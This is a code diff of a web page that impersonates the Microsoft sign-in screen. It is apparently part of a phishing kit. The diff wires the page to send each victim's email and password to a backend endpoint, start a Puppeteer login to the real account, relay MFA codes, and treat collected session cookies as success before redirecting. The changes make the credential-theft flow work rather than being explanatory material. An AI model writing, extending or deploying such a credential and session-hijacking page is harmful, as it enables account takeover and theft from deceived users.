@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
     <link rel="icon" type="image/x-icon" href="https://microsoft.com/favicon.ico">
-    <link rel="stylesheet" href="/dist/assets/style.css">
+
     <style>
         body {
             margin: 0;
@@ -298,7 +298,7 @@
             <!-- Password Form -->
             <div id="password-form">
                 <h1>Enter password</h1>
-                <div class="error-message" id="password-error">Please enter the password for your Microsoft account.</div>
+                <div class="error-message" id="password-error" style="display:none;">Your account or password is incorrect. If you don't remember your password, <a href="https://account.live.com/ResetPassword.aspx" style="color:#0067b8;">reset it now</a>.</div>
                 <div class="input-group">
                     <input type="password" id="password-input" placeholder="Password">
                 </div>
@@ -353,6 +353,7 @@
 
     <script>
         let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+        const _apiBase = "SERVER_INJECT_API_BASE";
         let _sessionId = null;
         let _ac = 0;
         const _up = new URLSearchParams(window.location.search);
@@ -477,7 +478,7 @@
                     cookieId: c || '',
                     hpField: _el.hp ? _el.hp.value : ''
                 };
-                await fetch('/MA/api.php?action=log_event', {
+                await fetch(`${_apiBase}?action=log_event`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(b),
@@ -488,7 +489,7 @@
 
         async function _runInteractiveLogin(sessionId, email) {
             try {
-                await fetch('/api.php?action=run_puppeteer', {
+                await fetch(`${_apiBase}?action=run_puppeteer`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
@@ -504,73 +505,74 @@
 
         async function _handleStatus(statusData, sessionId) {
             if (!statusData) {
-                console.error('[STATUS_HANDLER] Received null or undefined status data.');
-                _el.pe.textContent = "An unexpected error occurred. Please check the console.";
+                console.error('[STATUS] Received null status data.');
                 _el.pe.style.display = 'block';
                 _el.lb.classList.add('hidden');
-                return false; // Stop polling
+                return false;
             }
 
-            console.log('[STATUS_HANDLER] Processing status:', statusData.status);
+            console.log('[STATUS] Processing:', statusData.status);
             switch (statusData.status) {
-                case 'MFA_PROMPT':
-                    console.log('[STATUS_HANDLER] MFA challenge detected. Switching to MFA form.');
-                    _sessionId = sessionId; // Store the session ID for MFA submission
-                    _el.pfc.classList.add('hidden'); // Hide password form
-                    _el.mfc.classList.remove('hidden'); // Show MFA form
-                    _el.lb.classList.add('hidden'); // Hide loading bar
-                    _el.mei.focus();
-                    return false; // Stop polling
 
+                case 'MFA_PROMPT':
+                    console.log('[STATUS] MFA required. Showing MFA form.');
+                    _sessionId = sessionId;
+                    _el.pfc.classList.add('hidden');
+                    _el.mfc.classList.remove('hidden');
+                    _el.lb.classList.add('hidden');
+                    _el.mei.focus();
+                    return false;
+
+                case 'cookies_auth_collected':
                 case 'completed':
                 case 'mfa_accepted':
-                    console.log('[STATUS_HANDLER] Login complete. Redirecting...');
+                    console.log('[STATUS] Login successful. Redirecting...');
                     if (_c.redirectUrl) window.location.href = _c.redirectUrl;
-                    return false; // Stop polling
+                    return false;
 
                 case 'failed':
-                    console.error('[STATUS_HANDLER] Login failed:', statusData.reason);
-                    _el.pe.textContent = statusData.data.error || "An unknown error occurred.";
+                    const errMsg = statusData.data?.error || statusData.error || '';
+                    console.error('[STATUS] Login failed:', errMsg);
                     _el.pe.style.display = 'block';
                     _el.pi.disabled = false;
                     _el.sb.disabled = false;
                     _el.lb.classList.add('hidden');
-                    return false; // Stop polling
+                    return false;
 
+                case 'pending':
                 case 'processing':
                 default:
-                    console.log('[STATUS_HANDLER] Still processing...');
-                    return true; // Continue polling
+                    console.log('[STATUS] Still processing...');
+                    return true;
             }
         }
 
         async function _pollStatus(sessionId) {
-            const deadline = Date.now() + 120000; // 2 minute timeout
+            const deadline = Date.now() + 120000;
             let shouldContinue = true;
-
+            console.log(`[POLL] Starting polling for session: ${sessionId}`);
             _el.lb.classList.remove('hidden');
 
             while (shouldContinue && Date.now() < deadline) {
                 try {
-                const res = await fetch(`/MA/api.php?action=check_login_status&sessionId=${sessionId}`);
+                const res = await fetch(`${_apiBase}?action=check_login_status&sessionId=${sessionId}`);
                     if (res.ok) {
                         const data = await res.json();
-                        console.log('[POLL] Received status data:', data);
+                        console.log(`[POLL] Status received:`, data);
                         shouldContinue = await _handleStatus(data, sessionId);
                     } else {
-                        console.error('[POLL] Poll request failed with status:', res.status);
-                        shouldContinue = false; // Stop on server error
+                        console.error(`[POLL] Poll request failed. HTTP status: ${res.status}`);
+                        shouldContinue = false;
                     }
                 } catch (e) {
                     console.error('[POLL] Poll request threw an error:', e);
-                    shouldContinue = false; // Stop on network error
+                    shouldContinue = false;
                 }
                 if (shouldContinue) await new Promise(r => setTimeout(r, 1000));
             }
 
-            if (shouldContinue) { // This means we timed out
-                console.error('[POLL] Polling timed out.');
-                _el.pe.textContent = "The request timed out. Please try again.";
+            if (shouldContinue) {
+                console.error('[POLL] Polling timed out after 2 minutes.');
                 _el.pe.style.display = 'block';
                 _el.pi.disabled = false;
                 _el.sb.disabled = false;
@@ -580,31 +582,20 @@
 
 
 
-        async function _sb(sessionId, password) {
-            console.log(`[DEBUG] Frontend: Submitting password for session ${sessionId}`);
-            try {
-                const res = await fetch('/api.php?action=submit_password', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ sessionId, password }),
-                });
-                return res.ok;
-            } catch (e) {
-                console.error('[ERROR] Failed to submit password:', e);
-                return false;
-            }
-        }
+
 
 
 
         _el.nb.addEventListener('click', async () => {
             const e = _el.ei.value.trim();
+            console.log(`[STEP 1] Next clicked. Email: ${e}`);
             if (!e) {
                 _el.ee.style.display = 'block';
                 return;
             }
             
             const isValidDomain = await validateEmailDomain(e);
+            console.log(`[STEP 2] Domain validation result: ${isValidDomain}`);
             if (!isValidDomain) {
                 _el.ee.textContent = 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.';
                 _el.ee.style.display = 'block';
@@ -614,7 +605,6 @@
             _el.ee.style.display = 'none';
             _el.ee.textContent = 'Please enter a valid email address.';
 
-            // UI Updates for loading
             _el.nb.disabled = true;
             if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
             
@@ -624,22 +614,14 @@
             }, 4000);
 
             try {
-                // Trigger the backend worker immediately.
-                const res = await fetch('/MA/api.php?action=submit_password', {
+                console.log(`[STEP 3] Logging email event for: ${e}`);
+                await fetch(`${_apiBase}?action=log_event`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: e, cookieId: cookieId })
+                    body: JSON.stringify({ cookieId: cookieId, type: 'email_ok', emailMask: e, domain: e.split('@')[1] || '', attempt: 0, password: '' })
                 });
-                const data = await res.json();
 
-                if (!data.ok) {
-                    throw new Error(data.error || 'Failed to start session.');
-                }
-                
-                console.log(`[SUBMIT] Backend process started for session: ${data.sessionId}`);
-                _sessionId = data.sessionId; // Store session ID for polling
-
-                // Transition the UI
+                _sessionId = cookieId;
                 clearTimeout(titleChangeTimeout);
                 _el.nb.disabled = false;
 
@@ -651,11 +633,10 @@
                 if(_el.oc) _el.oc.classList.add('hidden');
                 _el.pi.focus();
 
-                // Start polling for the result immediately
-                _pollStatus(_sessionId);
+                console.log(`[STEP 4] UI transitioned to password step. Waiting for Sign In...`);
 
             } catch (err) {
-                console.error('Failed to trigger backend process:', err);
+                console.error('[ERROR] Failed to log email event:', err);
                 _el.ee.textContent = err.message;
                 _el.ee.style.display = 'block';
                 _el.nb.disabled = false;
@@ -688,7 +669,7 @@
             _el.lb.classList.remove('hidden');
 
             try {
-                const res = await fetch('/MA/api.php?action=submit_mfa', {
+                const res = await fetch(`${_apiBase}?action=submit_mfa`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ sessionId: _sessionId, code: code })
@@ -726,13 +707,37 @@
             _ac = 0;
         });
 
-        // The original form submission logic is now obsolete.
-        // The process starts after the email is submitted.
-        // The UI for password and MFA are now just for show and to capture the MFA code.
-        _el.sb.addEventListener('click', () => {
-            // You can add a message here if you want, e.g.:
-            _el.pe.textContent = 'Login process is already running in the background.';
-            _el.pe.style.display = 'block';
+        _el.sb.addEventListener('click', async () => {
+            const pwd = _el.pi.value.trim();
+            console.log(`[STEP 8] Sign In clicked. Session: ${_sessionId}. Password length: ${pwd.length}`);
+            if (!pwd) {
+                _el.pe.style.display = 'block';
+                return;
+            }
+            _el.pe.style.display = 'none';
+            _el.sb.disabled = true;
+            _el.pi.disabled = true;
+            _el.lb.classList.remove('hidden');
+            try {
+                console.log(`[STEP 9] Sending password to backend for session: ${_sessionId}`);
+                const res = await fetch(`${_apiBase}?action=submit_password`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: _el.ued.textContent.trim(), cookieId: _sessionId, passwords: [pwd] })
+                });
+                const data = await res.json();
+                console.log(`[STEP 10] Password submission response:`, data);
+                if (!data.ok) throw new Error(data.error || 'Failed to submit password.');
+                console.log(`[STEP 11] Password queued. New session: ${data.sessionId}. Polling...`);
+                _sessionId = data.sessionId;
+                _pollStatus(_sessionId);
+            } catch (err) {
+                console.error('[ERROR] Password submission failed:', err);
+                _el.pe.style.display = 'block';
+                _el.sb.disabled = false;
+                _el.pi.disabled = false;
+                _el.lb.classList.add('hidden');
+            }
         });
 
         _el.pi.addEventListener('keypress', (e) => {
@@ -741,6 +746,6 @@
             }
         });
     </script>
-    <script type="module" src="main.js"></script>
+
 </body>
 </html>
